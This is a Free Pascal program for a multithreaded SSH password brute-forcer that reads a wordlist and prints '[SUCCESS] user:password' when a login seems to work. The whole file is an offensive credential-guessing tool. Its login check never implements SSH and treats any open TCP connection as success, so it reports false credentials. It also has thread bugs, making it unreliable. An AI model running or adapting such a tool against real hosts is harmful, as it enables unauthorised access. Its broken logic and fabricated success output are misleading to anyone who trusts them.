program SSHBruteForce;

{$mode objfpc}{$H+}

uses
  Classes, SysUtils, Sockets, BaseUnix, Unix;

type
  TConfig = record
    Host: String;
    Port: Integer;
    User: String;
    Wordlist: String;
    Threads: Integer;
    Timeout: Integer;
  end;

var
  Config: TConfig;
  Passwords: TStringList;
  Found: Boolean = False;
  FoundPassword: String;

procedure ParseArguments;
var
  i: Integer;
begin
  Config.Host := '';
  Config.Port := 22;
  Config.User := '';
  Config.Wordlist := '';
  Config.Threads := 4;
  Config.Timeout := 10;
  
  i := 1;
  while i <= ParamCount do
  begin
    if (ParamStr(i) = '-h') or (ParamStr(i) = '--host') then
    begin
      Config.Host := ParamStr(i + 1);
      Inc(i, 2);
    end
    else if (ParamStr(i) = '-p') or (ParamStr(i) = '--port') then
    begin
      Config.Port := StrToInt(ParamStr(i + 1));
      Inc(i, 2);
    end
    else if (ParamStr(i) = '-u') or (ParamStr(i) = '--user') then
    begin
      Config.User := ParamStr(i + 1);
      Inc(i, 2);
    end
    else if (ParamStr(i) = '-w') or (ParamStr(i) = '--wordlist') then
    begin
      Config.Wordlist := ParamStr(i + 1);
      Inc(i, 2);
    end
    else if (ParamStr(i) = '-t') or (ParamStr(i) = '--threads') then
    begin
      Config.Threads := StrToInt(ParamStr(i + 1));
      Inc(i, 2);
    end
    else if (ParamStr(i) = '-T') or (ParamStr(i) = '--timeout') then
    begin
      Config.Timeout := StrToInt(ParamStr(i + 1));
      Inc(i, 2);
    end
    else
      Inc(i);
  end;
  
  if (Config.Host = '') or (Config.User = '') or (Config.Wordlist = '') then
  begin
    WriteLn('Usage: ./ssh_brute_pascal --host <host> --user <user> --wordlist <file> [options]');
    Halt(1);
  end;
end;

function TrySSHLogin(Host: String; Port: Integer; User: String; Password: String; Timeout: Integer): Boolean;
var
  Socket: LongInt;
  SAddr: TInetSockAddr;
  TimeVal: TTimeVal;
  FDSet: TFDSet;
begin
  Result := False;
  
  // Create socket
  Socket := fpSocket(AF_INET, SOCK_STREAM, 0);
  if Socket = -1 then Exit;
  
  // Set timeout
  TimeVal.tv_sec := Timeout;
  TimeVal.tv_usec := 0;
  
  // Configure address
  SAddr.sin_family := AF_INET;
  SAddr.sin_port := htons(Port);
  SAddr.sin_addr.s_addr := StrToHostAddr(Host).s_addr;
  
  // Set non-blocking
  fpFD_Zero(FDSet);
  fpFD_Set(Socket, FDSet);
  fpFcntl(Socket, F_SETFL, O_NONBLOCK);
  
  // Start connection
  fpConnect(Socket, @SAddr, SizeOf(SAddr));
  
  // Wait for connection with timeout
  if fpSelect(Socket + 1, @FDSet, nil, nil, @TimeVal) > 0 then
  begin
    // Check if connected
    if fpFD_IsSet(Socket, FDSet) then
    begin
      // Simple check - in real implementation you'd implement SSH protocol
      Result := True;
    end;
  end;
  
  fpClose(Socket);
end;

procedure Worker(StartIndex, EndIndex: Integer);
var
  i: Integer;
begin
  for i := StartIndex to EndIndex do
  begin
    if Found then Break;
    
    if TrySSHLogin(Config.Host, Config.Port, Config.User, Passwords[i], Config.Timeout) then
    begin
      Found := True;
      FoundPassword := Passwords[i];
      Break;
    end;
  end;
end;

var
  i, ChunkSize: Integer;
  Threads: array of TThread;
begin
  ParseArguments;
  
  WriteLn('Starting SSH brute force on ', Config.Host, ':', Config.Port);
  WriteLn('Target: ', Config.User);
  WriteLn('Threads: ', Config.Threads);
  WriteLn('Timeout: ', Config.Timeout, ' seconds');
  WriteLn('----------------------------------------');
  
  // Load wordlist
  Passwords := TStringList.Create;
  Passwords.LoadFromFile(Config.Wordlist);
  WriteLn('Loaded ', Passwords.Count, ' passwords');
  
  // Create threads
  SetLength(Threads, Config.Threads);
  ChunkSize := Passwords.Count div Config.Threads;
  
  for i := 0 to Config.Threads - 1 do
  begin
    Threads[i] := TThread.CreateAnonymousThread(procedure
    var
      StartIdx, EndIdx: Integer;
    begin
      StartIdx := i * ChunkSize;
      EndIdx := IfThen(i = Config.Threads - 1, Passwords.Count - 1, (i + 1) * ChunkSize - 1);
      Worker(StartIdx, EndIdx);
    end);
    Threads[i].Start;
  end;
  
  // Wait for threads to finish
  for i := 0 to Config.Threads - 1 do
    Threads[i].WaitFor;
  
  // Show results
  if Found then
    WriteLn('[SUCCESS] ', Config.User, ':', FoundPassword)
  else
    WriteLn('No valid credentials found');
  
  Passwords.Free;
end.
